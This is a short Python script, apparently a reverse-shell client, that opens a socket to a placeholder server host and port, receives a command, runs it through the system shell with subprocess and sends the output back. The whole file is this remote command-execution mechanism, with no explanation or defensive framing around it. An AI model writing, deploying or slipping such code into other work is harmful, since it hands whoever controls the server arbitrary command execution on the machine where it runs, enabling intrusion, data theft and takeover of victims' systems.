import socket
import subprocess

def main():
    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Get the hostname of the server
    host = "hostname_or_ip_of_server"  # Replace with the hostname or IP address of the server
    port = 12345  # Use the same port as the server
    
    # Connect to the server
    client_socket.connect((host, port))
    
    # Receive command from server
    command = client_socket.recv(1024).decode()
    
    # Execute command and send output back to server
    try:
        output = subprocess.check_output(command, shell=True)
        client_socket.send(output)
    except Exception as e:
        client_socket.send(str(e).encode())
    
    # Close socket
    client_socket.close()

if __name__ == "__main__":
    main()
